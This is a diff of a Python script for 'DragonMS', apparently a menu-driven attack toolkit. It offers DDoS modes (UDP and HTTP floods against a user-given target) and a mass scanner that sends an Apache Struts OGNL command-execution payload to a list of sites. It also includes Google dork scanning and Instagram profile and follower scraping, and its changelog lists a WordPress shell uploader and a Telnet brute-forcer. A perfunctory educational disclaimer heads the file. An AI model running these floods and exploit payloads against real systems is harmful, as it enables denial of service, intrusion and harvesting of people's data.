@@ -1,30 +1,31 @@
 #!/usr/bin/python3
 #
-# Disclaimer:- This project was created for educational purposes and 
-# should not be used in environments without legal authorization. 
+# Disclaimer:- This project was created for educational purposes and
+# should not be used in environments without legal authorization.
 # Author will be not responsible for any damage!
 #
-# =================================================================
-#  Visit our website : animcra.tech | http://dragonms.animcra.tech
-#  GitHub            : https://github.com/malam-x
-#  YouTube           : DR4G Clew
-# =================================================================
+# ====================================================================
+# Visit our website : ...
+# GitHub            : https://github.com/malam-x
+# YouTube           : DR4G Clew
+# ====================================================================
 # Tested On
-# - Debian/Parrot OS
-# - Ubuntu 18 LTS
-# =================================================================
-# Author/Programmed   : DR4G0N5 / TEMO
-# Greetz to dark coder: b4ltazar, d3hydr8
-# Credits             : LeeOn, Aman, Makman, LAKER
-# =================================================================
-# any issues with our tools?
-# let me know: malamcoder@gmail.com
-#              drag@animcra.tech
+# - Parrot OS
+# - Ubuntu 18/20 LTS
+# - Elementary OS
+# - Kali Linux
+# - MxLinux
+# - Windows 10
+# ====================================================================
+# Author/Programmed   : DR4G0N5 and Q3N
+# Greetz to dark coder: b4ltazar, d3hydr8, Eclipse, Pr1nce
+# ====================================================================
+# Just enjoy and modify as you like! (*-*)
+#
 #
 
 #Module
 from __future__ import with_statement
-from etc.version import __version__
 from lib.list import list_tools
 from lib.tools.Windows import back_windows
 from lib.tools.Mac import back_mac
@@ -33,37 +34,49 @@ from lib.tools.Web import back_web
 from lib.tools.Script import back_script
 from lib.tools.Shell import back_shell
 from lib.tools.Android import back_android
+from lib.version import __version__
 from lib.list import *
+
+xver = '1.0'
 
 # - Import Library
 try:
-    import re, datetime, os.path
-    import sys,os,json, socket, time
-    import requests, base64,contextlib
+    #commands, StringIO, string
+    import ftplib, smtplib, fnmatch
+    import re, datetime, os.path, selenium, threading, random
+    import sys, os, json, socket, time
+    import requests, base64, contextlib
     import urllib.request
-    import instaloader,getpass,twint
+    import instaloader, getpass, twint
     import pandas as pd
     import urllib3, subprocess
 except ImportError:
     def INSTALLER():
         try:
-            MODULESs = ['requests', 'hashlib', 'pytube', 'pandas', 'bs4', 'colorama', 'twint', 'wikipedia', 
-            'cybercrimetracker', 'scapy', 'instaloader']
+            MODULESs = ['requests', 'hashlib', 'pytube', 'pandas', 'bs4', 'colorama', 'twint', 'wikipedia',
+            'cybercrimetracker', 'scapy', 'instaloader', 'selenium', 'ftplib']
             for MODULES in MODULESs:
                 try:
-                    if(sys.version_info[0] < 3):os.system('cd C:\Python27\Scripts & pip install {}'.format(MODULES))
-                    else:os.system('pip install {}'.format(MODULES))
-                    print(' [+] {} has been installed successfully, Restart the program.\n'.format(MODULES))
-                except:print(' [-] Install {} manually.\n'.format(MODULES))
+                    if(sys.version_info[0] < 3):os.system('pip2 install {}'.format(MODULES))
+                    else:os.system('pip install {} && pip install selenium'.format(MODULES)), print(' [+] {} has been installed successfully.\n'.format(MODULES))
+                except:
+                    try:os.system('pip3 install -r requirements.txt && clear'),print('Done!') # MANUALLY INSTALLER! (requirements.txt)
+                    except:pass
         except:pass
-    print(' [!] Please install Some requirements.\n [+] Press Enter for Installer!\n [!] CTRL+C For Exit!')
+    print(' [!] Please install Some requirements.\n [+] Press Enter for Installer!\n [!] CTRL+C For Exit!'),
     xxXxxxxx = input('')
     if '' in xxXxxxxx:INSTALLER()
     else:sys.exit('\n')
 
+# - Library
+from smtplib import SMTP
+from copy import copy
+from ftplib import FTP
+from time import sleep
 from random import randint
 from pytube import YouTube
 from sys import stdout
+from selenium import webdriver
 from collections import Counter
 from bs4 import BeautifulSoup
 from hashlib import sha256
@@ -88,7 +101,6 @@ headers = {'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
-
 ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
     "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
     "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -192,206 +204,194 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 #==================
 promt_choice = ' \u001b[1m[\u001b[32;1m+\u001b[0m\u001b[1m] Choice\u001b[0m: '
 promt_target = ' \u001b[1m[\u001b[32;1m+\u001b[0m\u001b[1m] Target\u001b[0m: '
-PULS         = '\u001b[1m[\u001b[32;1m+\u001b[0m\u001b[1m]\u001b[0m'
-MINS         = '\u001b[1m[\u001b[31m-\u001b[0m\u001b[1m]\u001b[0m'
-ERRORS       = '\u001b[1m[\u001b[31mERROR!\u001b[0m\u001b[1m]\u001b[0m'
-ERROR_SYM    = '[\u001b[31m✘\u001b[0m]'
-SUCES_SYM    = '[\u001b[32;1m✔\u001b[0m]'
-NFound       = '\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
-Aborted      = '\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
+PULS = '\u001b[1m[\u001b[32;1m+\u001b[0m\u001b[1m]\u001b[0m'
+MINS = '\u001b[1m[\u001b[31m-\u001b[0m\u001b[1m]\u001b[0m'
+ERRORS = '\u001b[1m[\u001b[31mERROR!\u001b[0m\u001b[1m]\u001b[0m'
+ERROR_SYM = '[\u001b[31m✘\u001b[0m]'
+SUCES_SYM = '[\u001b[32;1m✔\u001b[0m]'
+NFound = '\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
+Aborted = '\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
 #==================
-fr  = Fore.RED
-fc  = Fore.CYAN
-fw  = Fore.WHITE
-fg  = Fore.GREEN
-fm  = Fore.MAGENTA
-fy  = Fore.YELLOW
-fb  = Fore.BLUE
-sd  = Style.DIM
+fr = Fore.RED
+fc = Fore.CYAN
+fw = Fore.WHITE
+fg = Fore.GREEN
+fm = Fore.MAGENTA
+fy = Fore.YELLOW
+fb = Fore.BLUE
+sd = Style.DIM
 frs = Fore.RESET
-sn  = Style.NORMAL
-sb  = Style.BRIGHT
+sn = Style.NORMAL
+sb = Style.BRIGHT
 Internet = ''
 ip1 = randint(0, 250)
 ip2 = randint(0, 250)
 ip3 = randint(0, 250)
 ip4 = randint(0, 250)
-threads      = int(0)
-ip_target    = str(0)
-port_target  = int(0)
+threads = int(0)
+ip_target = str(0)
+port_target = int(0)
 total_attack = int(0)
-choice       = int(0)
-multi        = int(250)
-random_ip    = str(ip1)+'.'+str(ip1)+'.'+str(ip1)+'.'+str(ip1)
-ERROR_MSG   = '\u001b[1m[u001b[1m[\u001b[31mERROR\u001b[0m\u001b[1m]\u001b[0m'
+choice = int(0)
+multi = int(250)
+random_ip = str(ip1)+'.'+str(ip1)+'.'+str(ip1)+'.'+str(ip1)
+ERROR_MSG = '\u001b[1m[u001b[1m[\u001b[31mERROR\u001b[0m\u001b[1m]\u001b[0m'
 WARNING_MSG = fy+'[WARN]'
 SUCCESS_MSG = fy+'[SUCCESS]'
 IP_NOTFOUND = '\n\u001b[1m[\u001b[31mNOT FOUND IP!\u001b[0m\u001b[1m]\u001b[0m'
 vmains = ''
-
 def CHECK_INTERNET():
-    global Internet
+    global Internet, vmains
     clear()
-    print('\n %s[+] Checking Internet...'%fc)
     try:
         request = requests.get("http://animcra.tech/", timeout=5)
-        print(" %s [ONLINE]"%fg)
+        print('\n %s[+] Checking Internet...'%fc), time.sleep(2), print(" %s [ONLINE]"%fg)
         Internet = 'Online'
+        vmains = f'{sb}{fg}Online'
         time.sleep(2)
     except (requests.ConnectionError, requests.Timeout) as exception:
-        print(" %s%s[OFFLINE]"%(fr,sb))
+        print('\n %s[+] Checking Internet...'%fc), time.sleep(2.5),print(" %s%s[OFFLINE]"%(sb,fr))
         Internet = 'Offline'
+        vmains = f'{sb}{fr}Offline'
         time.sleep(3)
-
 def get_urls(search_string, start):
-    temp        = []
-    url         = 'http://www.google.com/search'
-    payload     = { 'q' : search_string, 'start' : start }
-    my_headers  = { 'User-agent' : 'Mozilla/11.0' }
-    r           = requests.get( url, params = payload, headers = my_headers )
-    soup        = BeautifulSoup( r.text, 'html.parser' )
-    h3tags      = soup.find_all( 'h3', class_='r' )
+    temp = []
+    url = 'http://www.google.com/search'
+    payload = { 'q' : search_string, 'start' : start }
+    my_headers = { 'User-agent' : 'Mozilla/11.0' }
+    r = requests.get( url, params = payload, headers = my_headers )
+    soup = BeautifulSoup( r.text, 'html.parser' )
+    h3tags = soup.find_all( 'h3', class_='r' )
     for h3 in h3tags:
-        try:
-            temp.append( re.search('url\?q=(.+?)\&sa', h3.a['href']).group(1) )
-        except:
-            continue
+        try:temp.append( re.search('url\?q=(.+?)\&sa', h3.a['href']).group(1) )
+        except:continue
     return temp
-
 def dork_scanner(search, pages, processes):
-    result      = []
-    search      = search
-    pages       = pages
-    processes   = int( processes )
+    result = []
+    search = search
+    pages = pages
+    processes = int( processes )
     make_request = partial( get_urls, search )
-    pagelist     = [ str(x*10) for x in range( 0, int(pages) ) ]
-    with Pool(processes) as p:
-        tmp = p.map(make_request, pagelist)
-    for x in tmp:
-        result.extend(x)
+    pagelist = [ str(x*10) for x in range( 0, int(pages) ) ]
+    with Pool(processes) as p:tmp = p.map(make_request, pagelist)
+    for x in tmp:result.extend(x)
     result = list( set( result ) )
     return result
-
-def console():
-    os.system('msfconsole')
+def console():os.system('msfconsole')
 def install():
     os.system('clear')
     os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&')
     os.system('./msfinstall')
     os.system('chmod 755 msfinstall &&')
-def MAIN_LIST(nok):
-    return '\u001b[1m[\u001b[32;1m%s\u001b[0m\u001b[1m]\u001b[0m'%nok
+def MAIN_LIST(nok):return '\u001b[1m[\u001b[32;1m%s\u001b[0m\u001b[1m]\u001b[0m'%nok
 def input_drg(txt):
-    try :
-        if(sys.version_info[0] < 3):
-            return raw_input(txt).strip()
-        else :
+    try:
+        if(sys.version_info[0] < 3):return raw_input(txt).strip()
+        else:
             sys.stdout.write(txt)
-            return input()
-    except:
-        return False
-
+            return input(f'{sb}')
+    except:return False
 def drag_content(req):
     try:
-        try:
-            return str(req.text)
+        try:return str(req.text)
         except:
-            try:
-                return str(req.content.encode('utf-8'))
-            except:
-                return str(req.content.decode('utf-8'))
-    except:
-        return str(req.content)
+            try:return str(req.content.encode('utf-8'))
+            except:return str(req.content.decode('utf-8'))
+    except:return str(req.content)
 def clean(tools_name):
-        lines_seen = set()
-        outfile = open(f'{tools_name}.txt', "a")
-        infile = open(f'{tools_name}list.txt', "r")
-        for line in infile:
-            if line not in lines_seen:
-                outfile.write(line)
-                lines_seen.add(line)
-        outfile.close()
-        infile.close()
-        if os.name == "nt":
-            os.system(f"del {tools_name}list.txt")
-        else:
-            os.system(f"rm -rf {tools_name}list.txt")
-        print(" %s[-] Duplicate %s removed successfully!"%(fr,tools_name))
-        print("\n %s[+] Dorks saved as %s.txt!"%(fb,tools_name))
+    lines_seen = set()
+    outfile = open(f'{tools_name}.txt', "a")
+    infile = open(f'{tools_name}list.txt', "r")
+    for line in infile:
+        if line not in lines_seen:
+            outfile.write(line)
+            lines_seen.add(line)
+    outfile.close()
+    infile.close()
+    if os.name == "nt":os.system(f"del {tools_name}list.txt")
+    else:os.system(f"rm -rf {tools_name}list.txt")
+    print(" %s[-] Duplicate %s removed successfully!"%(fr,tools_name))
+    print("\n %s[+] Dorks saved as %s.txt!"%(fb,tools_name))
+
+"""
+    INFORMATION
+"""
 def about_me():
-    global Internet
+    global Internet, xver, update
     Tools_Version = ''
     try:
-        try:
-            update = requests.get('http://dragonms.animcra.tech/pub/version.txt', headers=headers, timeout=15)
-        except:
-            update = requests.get('http://dragonms.animcra.tech/pub/version.txt', headers=headers, timeout=15)
+        try:update = requests.get('https://pastebin.com/raw/cCY86XQq', headers=headers, timeout=15)
+        except:update = requests.get('https://pastebin.com/raw/cCY86XQq', headers=headers, timeout=15)
         update = drag_content(update)
         if('main' not in update) :
-            update = requests.get('http://dragonms.animcra.tech/pub/version.txt', headers=headers, timeout=15)
+            update = requests.get('https://pastebin.com/raw/cCY86XQq', headers=headers, timeout=15)
             update = drag_content(update)
             Tools_Version += update
-    except requests.exceptions.ConnectionError:
-        Tools_Version += '%sConnect to Internet to see the latest version!%s'%(fr,fw)
+    except requests.exceptions.ConnectionError:Tools_Version += '%sConnect to Internet to see the latest version!%s'%(fr,fw)
     ABOUT_US_UPD = f'''
 
-   Name Tools  : DragonMS
-   Author      : DR4G0N5/TEMO
-   Credits     : LeeOn, Aman, LAKER, Makman
-   Greetz      : b4ltazar, d3hydr8, LordB0N3 and member TNA
-   Version     : {Tools_Version}
-   Website     : http://animcra.tech
-   Friends     : SaklarRusak, K4PUYU4K
-   Team        : TSecNetwork - Night Cracker
-   GitHub      : https://github.com/malam-x
+   {sb}{fg}Name Tools  : DragonMS [{fy}PUB{fg}]
+   {sb}{fg}Author      : DR4G0N5 & Q3N
+   {sb}{fg}Credits     : LeeOn, Aman, LAKER, Makman
+   {sb}{fg}Version     : {fb}{Tools_Version}
+   {sb}{fg}Friends     : P47r1ck, SaklarRusak, K4PUYU4K
+   {sb}{fg}GitHub      : https://github.com/malam-x
 
-  ============================================
+  {sb}{fb}============================================
 
-    UPDATE LOGS:
-      - Pentesting Tools (0.8)
-         - Shell Finder
-         - Google Scanner
-         - Google Scrapper
-         - Dork maker
-         - Dork scanner
-      - [NEW] Pentesting Tools (0.5)
-         - Web Cloning (wget)
-         - Mass WP Shell Uploader
-      - [UPDATE] News Design, Easy to Use.
+    {sb}UPDATE LOGS:
+      {sb}- [FIX] Some bug!
+      {sb}- Adf.ly BOT (1.3)
+      {sb}- Telnet Brute (1.2)
+      {sb}- Code Finder (1.1)
+      {sb}- Pentesting Tools (0.8)
+         {sb}- Shell Finder
+         {sb}- Google Scanner
+         {sb}- Google Scrapper
+         {sb}- Dork maker
+         {sb}- Dork scanner
+      {sb}- Pentesting Tools (0.5)
+         {sb}- Web Cloning (wget)
+         {sb}- Mass WP Shell Uploader
+      {sb}- [UPDATE] News Design, Easy to Use.
 
-  ============================================
-    
+  {sb}{fb}============================================
+
   '''
-    for zxxxx in ABOUT_US_UPD.split("\n"):
-        print(zxxxx)
-        time.sleep(0.5)
-
+    for zxxxx in ABOUT_US_UPD.split("\n"): print(zxxxx), time.sleep(0.1)
 def banner_drgn():
-    BANNER = """ 
-    %s  _____                              __  __  _____ 
-    %s |  __ \                            |  \/  |/ ____|
-    %s | |  | |_ __ __ _  __ _  ___  _ __ | \  / | (___  
-    %s | |  | | '__/ _` |/ _` |/ _ \| '_ \| |\/| |\___ \ 
-    %s | |__| | | | (_| | (_| | (_) | | | | |  | |____) |
-    %s |_____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|_____/ 
-    %s                    __/ |                          
-    %s                   |___/     %sv0.8
-    %s
-    %s    Programmed By %sDR4G0N5 / TEMO
-    %s    GitHub : %shttps://github.com/malam-x
-    %s    YouTube: %sDR4G Clew
-    %s    Website: %sanimcra.tech
-    """%(fm,fb,fm,fb,fm,fb,fm,fb,fc,fm,sb,fg,sb,fm,sb,fb,sb,fb,)
+    BANNER = r"""
+    {2}  _____                              __  __  _____
+    {1} |  __ \                            |  \/  |/ ____|
+    {2} | |  | |_ __ __ _  __ _  ___  _ __ | \  / | (___
+    {1} | |  | | '__/ _` |/ _` |/ _ \| '_ \| |\/| |\___ \
+    {2} | |__| | | | (_| | (_| | (_) | | | | |  | |____) |
+    {1} |_____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|_____/
+    {2}                    __/ |
+    {1}                   |___/
+    {5}
+    {5}    Programmed By {4}DR4G0N5 {5}{0}x {2}Q3N
+    """.format(fr,fm,fg,sb,fb,frs)
     for line in BANNER.split("\n"):
         print(line)
         time.sleep(0.1)
-
+def banner_lst(BannerName):
+    print(r"""
+    {2}  _____                              __  __  _____
+    {1} |  __ \                            |  \/  |/ ____|
+    {2} | |  | |_ __ __ _  __ _  ___  _ __ | \  / | (___
+    {1} | |  | | '__/ _` |/ _` |/ _ \| '_ \| |\/| |\___ \
+    {2} | |__| | | | (_| | (_| | (_) | | | | |  | |____) |
+    {1} |_____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|_____/
+    {2}                    __/ |
+    {1}                   |___/
+    {5}
+    {5}        {4}[+] {6} [+]
+    """.format(fr,fm,fg,sb,fb,frs,BannerName))
 def clear():
     if sys.platform.startswith('linux'): os.system('clear')
     elif sys.platform.startswith('freebsd'): os.system('clear')
     else: os.system('cls')
-
-#Main
 def main():
     clear()
     try:
@@ -410,19 +410,16 @@ def main():
         elif choice == 'start' or choice == 'START': console()
         elif (choice == '00') or (choice == '0'): os.system('python3 main.py')
         else: sys.exit(NFound)
-    except KeyboardInterrupt:
-        sys.exit(Aborted)
-
+    except KeyboardInterrupt:sys.exit(Aborted)
 def banner_ms():
     print('''%s
-   ____                              __  __ ____  
-  |  _ \ _ __ __ _  __ _  ___  _ __ |  \/  / ___| 
-  | | | | '__/ _` |/ _` |/ _ \| '_ \| |\/| \___ \ 
+   ____                              __  __ ____
+  |  _ \ _ __ __ _  __ _  ___  _ __ |  \/  / ___|
+  | | | | '__/ _` |/ _` |/ _ \| '_ \| |\/| \___ \
   | |_| | | | (_| | (_| | (_) | | | | |  | |___) |
-  |____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|____/ 
-                   |___/                          
+  |____/|_|  \__,_|\__, |\___/|_| |_|_|  |_|____/
+                   |___/
                    \n'''%fg)
-
 def main_tools():
 
     ip1 = randint(0, 250)
@@ -447,8 +444,7 @@ def main_tools():
         print(' %s DDOS'%MAIN_LIST('01'))
         print(' %s TRACKER'%MAIN_LIST('02'))
         print(' %s SCANNER'%MAIN_LIST('03'))
-        print(' %s SCRAPER'%MAIN_LIST('04'))        
-        print(' %s MAPPER(Cooming Soon!)'%MAIN_LIST('05'))
+        print(' %s SCRAPER'%MAIN_LIST('04'))
         print(' %s Back to main\n'%MAIN_LIST('00'))
         while True:
             x = int(input_drg(promt_choice))
@@ -467,48 +463,36 @@ def main_tools():
                         elif choice == '2':http_flood(ip_target, threads)
                         elif choice == '3':udp_flood_perl(ip_target, port_target, threads)
                 class start_min:
-                    def __init__(self):
-                        self.main_launc()
+                    def __init__(self):self.main_launc()
                     def main_launc(self):
-                            clear()
-                            banner_ms()
-                            try:
-                                self.target()
-                                self.port()
-                                self.thread()
-                                mode()
-                                self.start()
-                            except KeyboardInterrupt:
-                                sys.exit(Aborted)
+                        clear()
+                        banner_ms()
+                        try:
+                            self.target()
+                            self.port()
+                            self.thread()
+                            mode()
+                            self.start()
+                        except KeyboardInterrupt:sys.exit(Aborted)
                     def target(self):
                         global ip_target
                         try:
                             ip_targets = input_drg(f'{PULS} IP Target : ')
                             if len(ip_targets) <= 5 or ip_targets == '':sys.exit(f'{IP_NOTFOUND}')
                             elif '.' not in ip_targets:sys.exit(IP_NOTFOUND)
-                            else:
-                                ip_target = ip_targets
-                                time.sleep(0.2)
+                            else:ip_target = ip_targets
                             ip_target = ip_targets
                             try:
                                 try:
-                                    if ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "www.":
-                                        ip_targets = "http://" + ip_targets
-                                    elif ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "http":
-                                        pass
-                                    else:
-                                        ip_targets = "http://" + ip_targets
-                                except:
-                                    self.target()
-                                try:
-                                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
-                                except:
-                                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0]
+                                    if ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "www.":ip_targets = "http://" + ip_targets
+                                    elif ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "http":pass
+                                    else:ip_targets = "http://" + ip_targets
+                                except:self.target()
+                                try:self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+                                except:self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0]
                                 ip_host = socket.gethostbyname(self.host)
-                            except:
-                                self.target()
-                        except KeyboardInterrupt:
-                            sys.exit(Aborted)
+                            except:self.target()
+                        except KeyboardInterrupt:sys.exit(Aborted)
                     def port(self):
                         global port_target
                         global port_targets
@@ -518,19 +502,15 @@ def main_tools():
                                 if 'https' in ip_target:port_target = int(443)
                                 else:port_target = int(80)
                             elif len(port_targets) == '1':port_target = int(80)
-                            else:
-                                port_target = port_targets
-                                time.sleep(0.2)
-                        except ValueError:
-                            port_target = int(80)
+                            else:port_target = port_targets
+                        except ValueError:port_target = int(80)
                     def thread(self):
                         global threads
                         try:
                             thread_c = int(input_drg(f'{PULS} Thread[2000]: '))
                             if thread_c == '':threads = 2000
                             else:threads += thread_c
-                        except ValueError:
-                            threads = 2000
+                        except ValueError:threads = 2000
                     def start(self):
                         clear()
                         ready = input_drg(f'\n\n  {PULS} ENTER TO LAUNCH.')
@@ -553,45 +533,34 @@ def main_tools():
                                     sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
                                     sys.stdout.flush()
                             except:
-                                try:
-                                    s.close()
-                                except:
-                                    pass
+                                try:s.close()
+                                except:pass
                         except:
-                            try:
-                                s.close()
-                            except:
-                               pass
-
+                            try:s.close()
+                            except:pass
                 def http_flood(target, threads):
                     try:
                         sec=input_drg(f'{PULS} Second: ')
-                        print('[1] Get\n[2] Post')
+                        print('{}[1] Get\n{}[2] Post'.format(sb,sb))
                         met=input_drg(promt_choice)
                         if met == '1':met = 'get'
                         elif met == '2':met = 'post'
                         elif sec == '':sec = 60
                         os.system(f'go run tools/net/DDOS/http_flood.go {target} {threads} {met} {sec} tools/net/DDOS/header.txt')
-                    except KeyboardInterrupt:
-                        sys.exit(Aborted)
-                    except ValueError:
-                        sys.exit(NFound)
-                try:
-                    start_min()
-                except ValueError:
-                    sys.exit(NFound)
+                    except KeyboardInterrupt:sys.exit(Aborted)
+                    except ValueError:sys.exit(NFound)
+                try:start_min()
+                except ValueError:sys.exit(NFound)
             elif (x == 2):
                 query = input_drg(' Url: ')
                 x = (json.dumps(cybercrimeTrackerAPI().search(query), indent=2))
                 NAME_PATH = 'result/track_result.txt'
-                with open(f'{NAME_PATH}', 'w') as f:
-                    f.write(x)
+                with open(f'{NAME_PATH}', 'w') as f:f.write(x)
                 print(f'{PULS} Success check /{NAME_PATH}')
             elif (x == 3):
                 def mass_apache(choice):
                     c = choice
                     os.system('cls' and 'color -a' if os.name == "nt" else 'clear')
-
                     try:
                         fil = c
                         exp = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo pentesterdesk').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getinput_drgStream(),#ros)).(#ros.flush())}"
@@ -601,16 +570,12 @@ def main_tools():
                         lists = ob.readlines()
                         list1 = []
                         i = 0
-                        for i in range(len(lists)):
-                            list1.append(lists[i].strip('\n'))
+                        for i in range(len(lists)):list1.append(lists[i].strip('\n'))
                         for site in list1:
                             req= requests.get(url=site,headers=header)
                             if 'pentesterdesk' in req.content:print(f" {SUCES_SYM} %s [Vulnerable]"%(site))
                             else:print(f" {ERROR_SYM} %s [Not-Vulnerable]"%(site))
-
-                    except:
-                        pass
-
+                    except:pass
                 clear()
                 banner_ms()
                 print(' %s Mass Apache\n [CTRL+C] EXIT\n'%MAIN_LIST('01'))
@@ -621,10 +586,8 @@ def main_tools():
                         if x == 1 or len(x) == 1:mass_apache(z)
                         elif z == '':sys.exit(f'{MINS} Unknown Path.')
                         else:sys.exit(f'{NFound}')
-                    except ValueError:
-                        sys.exit(f'{MINS} Value Error.')
-                except KeyboardInterrupt:
-                    sys.exit(f'{Aborted}')
+                    except ValueError:sys.exit(f'{MINS} Value Error.')
+                except KeyboardInterrupt:sys.exit(f'{Aborted}')
             elif (x == 4):
                 clear()
                 banner_ms()
@@ -636,6 +599,7 @@ def main_tools():
                     print(' %s Youtube Scrape'%MAIN_LIST('04'))
                     x = int(input_drg(promt_choice))
                     if x == 'web scrape':
+                        pass
                         """
                         class Scraper:
                             def __init__(self, site):
@@ -654,30 +618,16 @@ def main_tools():
                                         print("\n" + url)
                         def mainscrap(scr):
                             Scraper(scr).scrape()"""
-
                     elif x == 1:
-                        if Kivy_Platform == 'android':
-                            sys.exit('Android Not Support!') 
-                        else:
                             bot = instaloader.Instaloader()
                             def ig_info(users):
                                 try:
                                     profile = instaloader.Profile.from_username(bot.context, f'{users}')
-                                    x = (f"""
-    ==========| INSTAGRAM INFO |===========
-        [+] Username   : {profile.username}
-        [+] User ID    : {profile.userid}
-        [+] Followers  : {profile.followers}
-        [+] Followees  : {profile.followees}
-        [+] Bio        : {profile.biography,profile.external_url}
-        [+] Total Post : {profile.mediacount}
-    =======================================""")
+                                    x = (f"\n {fb}[+] Username   : {fg}{fg}{profile.username}\n {fb}[+] User ID    : {fg}{fg}{profile.userid}\n {fb}[+] Followers  : {fg}{fg}{profile.followers}\n {fb}[+] Followees  : {fg}{fg}{profile.followees}\n {fb}[+] Bio        : {fg}{fg}{profile.biography,profile.external_url}\n {fb}[+] Total Post : {fg}{fg}{profile.mediacount}")
                                     NAME_PATH = 'result/ig_scrap.txt'
-                                    with open(f'{NAME_PATH}', 'w') as wr:
-                                        wr.write(x)
+                                    with open(f'{NAME_PATH}', 'w') as wr:wr.write(x)
                                     print(f'{SUCES_SYM} Logs saved at [ {NAME_PATH} ]')
-                                except:
-                                    sys.exit(f'{ERROR_SYM} Username not found!')
+                                except:sys.exit(f'{ERROR_SYM} Username not found!')
 
                             def ig_login():
                                 try:
@@ -685,8 +635,7 @@ def main_tools():
                                     pw = getpass.getpass(f'{PULS} Password: ')
                                     bot.login(user=f"{us}",passwd=f"{pw}")
                                     bot.interactive_login(f"{us}")
-                                except:
-                                    sys.exit(f'{ERROR_SYM} Wrong Password / Username.')
+                                except:sys.exit(f'{ERROR_SYM} Wrong Password / Username.')
 
                             def scrap_foll():
                                 clear()
@@ -695,45 +644,32 @@ def main_tools():
                                 print(' %s Scraping Followers'%MAIN_LIST('01'))
                                 print(' %s Scraping Followees'%MAIN_LIST('02'))
                                 try:
-                                    profile = instaloader.Profile.from_username(bot.context, f'{res}')
-                                    followers = [follower.username for follower in profile.get_followers()]
-                                    followees = [followee.username for followee in profile.get_followees()]
+                                    profile,followers,followees = instaloader.Profile.from_username(bot.context, f'{res}'), [follower.username for follower in profile.get_followers()], [followee.username for followee in profile.get_followees()]
                                     x = int(input_drg(promt_choice))
                                     if x == 1:print(followers)
                                     elif x == 2:print(followees)
                                     else:raise ValueError(f'{ERRORS} INVALID VALUE.')
-                                except:
-                                    sys.exit(f'{ERRORS} Login Needed.')
-
+                                except:sys.exit(f'{ERRORS} Login Needed.')
                             def ig_downloader(users):
                                 profile = instaloader.Profile.from_username(bot.context, 'users')
                                 posts = profile.get_posts()
-                                for index, post in enumerate(posts, 1):
-                                    bot.download_post(post, target=f"{profile.username}_{index}")
-
+                                for index, post in enumerate(posts, 1):bot.download_post(post, target=f"{profile.username}_{index}")
                             def ghost_follow(users):
                                 USER = users
                                 PROFILE = USER
-
                                 bot.load_session_from_file(USER)
-
                                 profile = instaloader.Profile.from_username(bot.context, PROFILE)
-
                                 likes = set()
                                 print("Fetching likes of all posts of profile {}.".format(profile.username))
                                 for post in profile.get_posts():
                                     print(post)
                                     likes = likes | set(post.get_likes())
-
                                 print("Fetching followers of profile {}.".format(profile.username))
                                 followers = set(profile.get_followers())
-
                                 ghosts = followers - likes
-
                                 print("Storing ghosts into file.")
                                 with open("result/inactive-users.txt", 'w') as f:
-                                    for ghost in ghosts:
-                                        print(ghost.username, file=f)
+                                    for ghost in ghosts:print(ghost.username, file=f)
                             def main_scraper():
                                 clear()
                                 banner_ms()
@@ -755,10 +691,8 @@ def main_tools():
                                                     time.sleep(2)
                                                     main_scraper()
                                                 ig_info(res)
-                                            except:
-                                                sys.exit(f'{ERROR_SYM} Username not found!')
-                                        except KeyboardInterrupt:
-                                            sys.exit(f'{Aborted}')
+                                            except:sys.exit(f'{ERROR_SYM} Username not found!')
+                                        except KeyboardInterrupt:sys.exit(f'{Aborted}')
                                     elif x == 2:ig_login()
                                     elif x == 3:scrap_foll()
                                     elif x == 4:
@@ -766,14 +700,12 @@ def main_tools():
                                         banner_ms()
                                         try:
                                             res = input_drg(f'{PULS} Instagram Name: ')
-
                                             if res == '' or len(res) == '2':
